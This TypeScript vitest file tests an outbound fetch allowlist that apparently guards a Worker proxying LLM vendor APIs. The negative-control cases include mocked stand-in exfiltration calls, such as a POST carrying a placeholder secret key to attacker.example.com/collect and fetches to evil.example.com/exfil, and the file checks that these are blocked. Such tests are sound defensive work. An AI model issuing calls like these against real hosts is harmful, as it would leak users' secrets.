/**
 * outbound-allowlist vitest.
 *
 * Test classes:
 *   1. Positive: api.anthropic.com fetch passes through to underlying fetch.
 *   2. Negative-control (Conv 60): disallowed host throws OutboundHostNotAllowed;
 *      error message names the host; underlying fetch is never called (no
 *      request body or secret reaches the wire).
 *   3. Code-path: every fetch call site in src/ exercised under wrapper;
 *      all captured URLs have hostname api.anthropic.com. Includes the
 *      ANTHROPIC_BASE_URL override path (messages.ts:183-186) — a
 *      misconfigured base URL to a non-anthropic host is blocked at runtime.
 *   4. Idempotence: calling installFetchAllowlist() twice installs only one
 *      wrapper layer; underlying fetch is called once per request.
 *   5. AnthropicBaseUrlNotAllowed error class shape.
 *   6. _setAllowlistForTesting seam: replaces runtime allowlist.
 *   7. _resetForTesting resets _allowedSet to ALLOWED_OUTBOUND_HOSTS.
 *   8. installFetchAllowlist() accepts no extraHosts argument.
 */

import { describe, it, expect, beforeEach, vi } from "vitest";
import {
  installFetchAllowlist,
  OutboundHostNotAllowed,
  AnthropicBaseUrlNotAllowed,
  ALLOWED_OUTBOUND_HOSTS,
  _resetForTesting,
  _setAllowlistForTesting,
} from "../src/lib/outbound-allowlist";

type FetchFn = (input: RequestInfo | URL, init?: RequestInit) => Promise<Response>;

function setGlobalFetch(fn: FetchFn): void {
  (globalThis as unknown as { fetch: FetchFn }).fetch = fn;
}

function makeMockFetch(status = 200): { mock: ReturnType<typeof vi.fn>; urls: string[] } {
  const urls: string[] = [];
  const mock = vi.fn(async (input: RequestInfo | URL) => {
    const url = input instanceof Request ? input.url : String(input);
    urls.push(url);
    return new Response(null, { status });
  });
  return { mock, urls };
}

beforeEach(() => {
  _resetForTesting();
});

// ---------------------------------------------------------------------------
// 1. Positive: allowed host passes through
// ---------------------------------------------------------------------------

describe("positive: api.anthropic.com passes through", () => {
  it("fetch to api.anthropic.com reaches the underlying fetch", async () => {
    const { mock, urls } = makeMockFetch(200);
    setGlobalFetch(mock as unknown as FetchFn);

    installFetchAllowlist();
    const resp = await fetch("https://api.anthropic.com/v1/messages", { method: "POST" });

    expect(resp.status).toBe(200);
    expect(mock).toHaveBeenCalledOnce();
    expect(new URL(urls[0]).hostname).toBe("api.anthropic.com");
  });

  it("fetch with Request object to api.anthropic.com passes through", async () => {
    const { mock, urls } = makeMockFetch(200);
    setGlobalFetch(mock as unknown as FetchFn);

    installFetchAllowlist();
    const req = new Request("https://api.anthropic.com/v1/messages", { method: "POST" });
    const resp = await fetch(req);

    expect(resp.status).toBe(200);
    expect(mock).toHaveBeenCalledOnce();
    expect(new URL(urls[0]).hostname).toBe("api.anthropic.com");
  });
});

// ---------------------------------------------------------------------------
// 2. Negative-control (Conv 60): disallowed host throws
// ---------------------------------------------------------------------------

describe("negative-control (Conv 60): disallowed host throws OutboundHostNotAllowed", () => {
  it("example.com fetch throws OutboundHostNotAllowed", async () => {
    const { mock } = makeMockFetch(200);
    setGlobalFetch(mock as unknown as FetchFn);

    installFetchAllowlist();

    await expect(fetch("https://example.com/exfil")).rejects.toThrow(OutboundHostNotAllowed);
    expect(mock).not.toHaveBeenCalled();
  });

  it("error message names the blocked host", async () => {
    setGlobalFetch(vi.fn() as unknown as FetchFn);
    installFetchAllowlist();

    const error = await fetch("https://evil.example.com/exfil").catch((e) => e);
    expect(error).toBeInstanceOf(OutboundHostNotAllowed);
    expect(error.message).toContain("evil.example.com");
    expect(error.host).toBe("evil.example.com");
  });

  it("underlying fetch is not called — request body never reaches the wire", async () => {
    const { mock } = makeMockFetch(200);
    setGlobalFetch(mock as unknown as FetchFn);
    installFetchAllowlist();

    const body = JSON.stringify({ secret_key: "sk-sensitive-value" });
    await expect(
      fetch("https://attacker.example.com/collect", { method: "POST", body })
    ).rejects.toThrow(OutboundHostNotAllowed);

    // Underlying fetch was never called — body never left the Worker.
    expect(mock).not.toHaveBeenCalled();
  });

  it("error message does not include request body", async () => {
    setGlobalFetch(vi.fn() as unknown as FetchFn);
    installFetchAllowlist();

    const body = JSON.stringify({ secret_key: "sk-sensitive-value" });
    const error = await fetch("https://attacker.example.com/collect", {
      method: "POST",
      body,
    }).catch((e) => e);

    expect(error).toBeInstanceOf(OutboundHostNotAllowed);
    expect(error.message).not.toContain("sk-sensitive-value");
  });
});

// ---------------------------------------------------------------------------
// 3. Code-path: all existing fetch call sites in src/ exercised under wrapper
// ---------------------------------------------------------------------------

describe("code-path: existing fetch call sites produce api.anthropic.com URLs", () => {
  /**
   * messages.ts:183-186 constructs upstreamUrl from ANTHROPIC_BASE_URL env
   * var with a fallback to "https://api.anthropic.com". Verify the default
   * path produces api.anthropic.com and the wrapper passes it through.
   */
  it("messages.ts default upstreamUrl (no ANTHROPIC_BASE_URL) -> api.anthropic.com", async () => {
    const { mock, urls } = makeMockFetch(200);
    setGlobalFetch(mock as unknown as FetchFn);
    installFetchAllowlist();

    // Mirror the URL construction logic from messages.ts:183-186.
    const env = {} as { ANTHROPIC_BASE_URL?: string };
    const upstreamUrl = env.ANTHROPIC_BASE_URL ?? "https://api.anthropic.com";
    await fetch(`${upstreamUrl}/v1/messages`, { method: "POST" });

    expect(mock).toHaveBeenCalledOnce();
    expect(new URL(urls[0]).hostname).toBe("api.anthropic.com");
  });

  /**
   * If ANTHROPIC_BASE_URL is misconfigured to a non-anthropic host, the
   * wrapper blocks it. This is the runtime defense against env var mistakes
   * that would otherwise allow exfiltration via the messages.ts code path.
   */
  it("messages.ts ANTHROPIC_BASE_URL misconfigured -> wrapper blocks it", async () => {
    const { mock } = makeMockFetch(200);
    setGlobalFetch(mock as unknown as FetchFn);
    installFetchAllowlist();

    const badBaseUrl = "https://evil.example.com";
    await expect(
      fetch(`${badBaseUrl}/v1/messages`, { method: "POST" })
    ).rejects.toThrow(OutboundHostNotAllowed);

    expect(mock).not.toHaveBeenCalled();
  });
});

// ---------------------------------------------------------------------------
// 4. Idempotence: double-install does not double-wrap
// ---------------------------------------------------------------------------

describe("idempotence: double installFetchAllowlist() does not double-wrap", () => {
  it("second call is a no-op; underlying fetch called once per request", async () => {
    const { mock } = makeMockFetch(200);
    setGlobalFetch(mock as unknown as FetchFn);

    installFetchAllowlist();
    const afterFirst = (globalThis as unknown as { fetch: FetchFn }).fetch;

    installFetchAllowlist();
    const afterSecond = (globalThis as unknown as { fetch: FetchFn }).fetch;

    // Same function reference — no new wrapper layer.
    expect(afterSecond).toBe(afterFirst);

    // One request -> underlying fetch called exactly once (not twice).
    await fetch("https://api.anthropic.com/v1/messages");
    expect(mock).toHaveBeenCalledOnce();
  });
});

// ---------------------------------------------------------------------------
// Meta: ALLOWED_OUTBOUND_HOSTS constant
// ---------------------------------------------------------------------------

describe("ALLOWED_OUTBOUND_HOSTS", () => {
  it("is frozen", () => {
    expect(Object.isFrozen(ALLOWED_OUTBOUND_HOSTS)).toBe(true);
  });

  it("contains all expected base hosts, §1.17.15 BYOK upstream vendors, §1.17.16 OAuth upstreams, and §1.17.17 Bedrock", () => {
    expect(ALLOWED_OUTBOUND_HOSTS).toContain("api.anthropic.com");
    expect(ALLOWED_OUTBOUND_HOSTS).toContain("api.openai.com");
    expect(ALLOWED_OUTBOUND_HOSTS).toContain("api.x.ai");
    expect(ALLOWED_OUTBOUND_HOSTS).toContain("dashscope-intl.aliyuncs.com");
    expect(ALLOWED_OUTBOUND_HOSTS).toContain("generativelanguage.googleapis.com");
    // §1.17.15 BYOK upstream vendors
    expect(ALLOWED_OUTBOUND_HOSTS).toContain("ai-gateway.vercel.sh");
    expect(ALLOWED_OUTBOUND_HOSTS).toContain("api.cohere.com");
    expect(ALLOWED_OUTBOUND_HOSTS).toContain("api.deepseek.com");
    expect(ALLOWED_OUTBOUND_HOSTS).toContain("api.fireworks.ai");
    expect(ALLOWED_OUTBOUND_HOSTS).toContain("api.groq.com");
    expect(ALLOWED_OUTBOUND_HOSTS).toContain("api.minimax.chat");
    expect(ALLOWED_OUTBOUND_HOSTS).toContain("api.mistral.ai");
    expect(ALLOWED_OUTBOUND_HOSTS).toContain("api.moonshot.ai");
    expect(ALLOWED_OUTBOUND_HOSTS).toContain("api.perplexity.ai");
    expect(ALLOWED_OUTBOUND_HOSTS).toContain("api.together.xyz");
    expect(ALLOWED_OUTBOUND_HOSTS).toContain("open.bigmodel.cn");
    expect(ALLOWED_OUTBOUND_HOSTS).toContain("openrouter.ai");
    expect(ALLOWED_OUTBOUND_HOSTS).toContain("router.huggingface.co");
    // §1.17.16 OAuth subscription upstreams
    expect(ALLOWED_OUTBOUND_HOSTS).toContain("auth.openai.com");
    expect(ALLOWED_OUTBOUND_HOSTS).toContain("chatgpt.com");
    expect(ALLOWED_OUTBOUND_HOSTS).toContain("accounts.x.ai");
    expect(ALLOWED_OUTBOUND_HOSTS).toContain("github.com");
    expect(ALLOWED_OUTBOUND_HOSTS).toContain("api.githubcopilot.com");
    expect(ALLOWED_OUTBOUND_HOSTS).toContain("chat.qwen.ai");
    expect(ALLOWED_OUTBOUND_HOSTS).toContain("portal.nousresearch.com");
    // §1.17.17 enterprise BYOK — AWS Bedrock SigV4
    expect(ALLOWED_OUTBOUND_HOSTS).toContain("bedrock-runtime.us-east-1.amazonaws.com");
    // §1.17.19 Vertex SA-token mint — Google OAuth2 token endpoint
    expect(ALLOWED_OUTBOUND_HOSTS).toContain("oauth2.googleapis.com");
    // W38-S731 Block 4 — spot-check a few of the 42 MCP egress hosts (W38-S734
    // unwired 7 → native-covered) + W38-S736 +2 fixed-host (length 74→76)
    // + B1 +1 model-registry host registry.ollama.ai (length 76→77).
    expect(ALLOWED_OUTBOUND_HOSTS).toContain("mcp.notion.com");
    expect(ALLOWED_OUTBOUND_HOSTS).toContain("mcp.stripe.com");
    expect(ALLOWED_OUTBOUND_HOSTS).toContain("mcp-us.zoom.us");
    expect(ALLOWED_OUTBOUND_HOSTS).toContain("agent365.svc.cloud.microsoft");
    expect(ALLOWED_OUTBOUND_HOSTS).toContain("api.salesforce.com");
    // B1 governed model-registry egress host (read-only GET, /model-registry/ leg).
    expect(ALLOWED_OUTBOUND_HOSTS).toContain("registry.ollama.ai");
    expect(ALLOWED_OUTBOUND_HOSTS).toHaveLength(77);
  });
});

// ---------------------------------------------------------------------------
// 5. AnthropicBaseUrlNotAllowed error class
// ---------------------------------------------------------------------------

describe("AnthropicBaseUrlNotAllowed error class", () => {
  it("name is AnthropicBaseUrlNotAllowed", () => {
    const err = new AnthropicBaseUrlNotAllowed("evil.example.com");
    expect(err.name).toBe("AnthropicBaseUrlNotAllowed");
  });

  it("host property contains exactly the blocked hostname", () => {
    const err = new AnthropicBaseUrlNotAllowed("evil.example.com");
    expect(err.host).toBe("evil.example.com");
  });

  it("message contains the hostname", () => {
    const err = new AnthropicBaseUrlNotAllowed("evil.example.com");
    expect(err.message).toContain("evil.example.com");
  });

  it("message does not include a port, path, or full URL — hostname only", () => {
    const err = new AnthropicBaseUrlNotAllowed("evil.example.com");
    // The error is constructed with a hostname (no scheme/port/path). Verify
    // the message doesn't accidentally include surrounding URL components.
    expect(err.message).not.toContain("https://");
    expect(err.message).not.toContain("http://");
    expect(err.message).not.toContain(":8080");
    expect(err.message).not.toContain("/v1/");
  });

  it("is an instance of Error", () => {
    const err = new AnthropicBaseUrlNotAllowed("evil.example.com");
    expect(err).toBeInstanceOf(Error);
  });
});

// ---------------------------------------------------------------------------
// 6. _setAllowlistForTesting seam
// ---------------------------------------------------------------------------

describe("_setAllowlistForTesting seam", () => {
  it("added host passes through after wrapper is installed", async () => {
    const { mock, urls } = makeMockFetch(200);
    setGlobalFetch(mock as unknown as FetchFn);

    installFetchAllowlist();
    _setAllowlistForTesting(["api.anthropic.com", "test.internal"]);

    const resp = await fetch("https://test.internal/path");
    expect(resp.status).toBe(200);
    expect(new URL(urls[0]).hostname).toBe("test.internal");
  });

  it("api.anthropic.com is blocked when not included in the test set", async () => {
    const { mock } = makeMockFetch(200);
    setGlobalFetch(mock as unknown as FetchFn);

    installFetchAllowlist();
    _setAllowlistForTesting(["only.this.host"]);

    await expect(fetch("https://api.anthropic.com/v1/messages")).rejects.toThrow(
      OutboundHostNotAllowed,
    );
    expect(mock).not.toHaveBeenCalled();
  });

  it("fetch to api.anthropic.com passes when included in test set", async () => {
    const { mock } = makeMockFetch(200);
    setGlobalFetch(mock as unknown as FetchFn);

    installFetchAllowlist();
    _setAllowlistForTesting(["api.anthropic.com", "mock.local"]);

    const resp = await fetch("https://api.anthropic.com/v1/messages");
    expect(resp.status).toBe(200);
    expect(mock).toHaveBeenCalledOnce();
  });

  it("takes effect when called before installFetchAllowlist", async () => {
    const { mock, urls } = makeMockFetch(200);
    setGlobalFetch(mock as unknown as FetchFn);

    // Call seam before install; verify wrapper uses the replacement set.
    _setAllowlistForTesting(["api.anthropic.com", "pre-install.host"]);
    installFetchAllowlist();

    await fetch("https://pre-install.host/check");
    expect(new URL(urls[0]).hostname).toBe("pre-install.host");
    expect(mock).toHaveBeenCalledOnce();
  });

  it("takes effect when called after installFetchAllowlist", async () => {
    const { mock } = makeMockFetch(200);
    setGlobalFetch(mock as unknown as FetchFn);

    installFetchAllowlist();
    // Disallowed before seam call.
    await expect(fetch("https://post-install.host/check")).rejects.toThrow(OutboundHostNotAllowed);

    // Add the host via seam; now it passes.
    _setAllowlistForTesting(["api.anthropic.com", "post-install.host"]);
    const resp = await fetch("https://post-install.host/check");
    expect(resp.status).toBe(200);
    expect(mock).toHaveBeenCalledOnce();
  });
});

// ---------------------------------------------------------------------------
// 7. _resetForTesting resets _allowedSet to ALLOWED_OUTBOUND_HOSTS
// ---------------------------------------------------------------------------

describe("_resetForTesting resets allowlist", () => {
  it("api.anthropic.com passes after _setAllowlistForTesting + _resetForTesting", async () => {
    const { mock } = makeMockFetch(200);
    setGlobalFetch(mock as unknown as FetchFn);

    installFetchAllowlist();
    _setAllowlistForTesting(["only.test.host"]);

    // Verify api.anthropic.com is blocked by the test set.
    await expect(fetch("https://api.anthropic.com/v1/messages")).rejects.toThrow(
      OutboundHostNotAllowed,
    );

    // Reset restores ALLOWED_OUTBOUND_HOSTS.
    _resetForTesting();
    setGlobalFetch(mock as unknown as FetchFn);
    installFetchAllowlist();

    const resp = await fetch("https://api.anthropic.com/v1/messages");
    expect(resp.status).toBe(200);
  });

  it("test-only host is blocked after reset", async () => {
    const { mock } = makeMockFetch(200);
    setGlobalFetch(mock as unknown as FetchFn);

    installFetchAllowlist();
    _setAllowlistForTesting(["api.anthropic.com", "temp.test.host"]);

    // temp.test.host passes before reset.
    await fetch("https://temp.test.host/ok");

    _resetForTesting();
    setGlobalFetch(mock as unknown as FetchFn);
    installFetchAllowlist();

    // temp.test.host is blocked after reset.
    await expect(fetch("https://temp.test.host/ok")).rejects.toThrow(OutboundHostNotAllowed);
  });

  it("allowlist after reset is exactly ALLOWED_OUTBOUND_HOSTS (no residue from seam call)", async () => {
    const { mock } = makeMockFetch(200);
    setGlobalFetch(mock as unknown as FetchFn);

    installFetchAllowlist();
    _setAllowlistForTesting(["api.anthropic.com", "extra1.host", "extra2.host"]);

    _resetForTesting();
    setGlobalFetch(mock as unknown as FetchFn);
    installFetchAllowlist();

    // Only api.anthropic.com should pass; extra hosts are gone.
    const resp = await fetch("https://api.anthropic.com/v1/messages");
    expect(resp.status).toBe(200);

    await expect(fetch("https://extra1.host/check")).rejects.toThrow(OutboundHostNotAllowed);
    await expect(fetch("https://extra2.host/check")).rejects.toThrow(OutboundHostNotAllowed);
  });
});

// ---------------------------------------------------------------------------
// 8. installFetchAllowlist() no-extraHosts signature
// ---------------------------------------------------------------------------

describe("installFetchAllowlist() takes no extraHosts argument", () => {
  it("install with no args uses only ALLOWED_OUTBOUND_HOSTS", async () => {
    const { mock } = makeMockFetch(200);
    setGlobalFetch(mock as unknown as FetchFn);

    installFetchAllowlist();

    // Passing no args: api.anthropic.com passes, everything else does not.
    const resp = await fetch("https://api.anthropic.com/v1/messages");
    expect(resp.status).toBe(200);

    await expect(fetch("https://other.host/check")).rejects.toThrow(OutboundHostNotAllowed);
  });

  it("extra host not in ALLOWED_OUTBOUND_HOSTS is blocked after plain install", async () => {
    const { mock } = makeMockFetch(200);
    setGlobalFetch(mock as unknown as FetchFn);

    installFetchAllowlist();

    // Historically extraHosts could widen the allowlist; now it's fixed.
    await expect(fetch("https://staging.internal/api")).rejects.toThrow(OutboundHostNotAllowed);
    expect(mock).not.toHaveBeenCalled();
  });
});
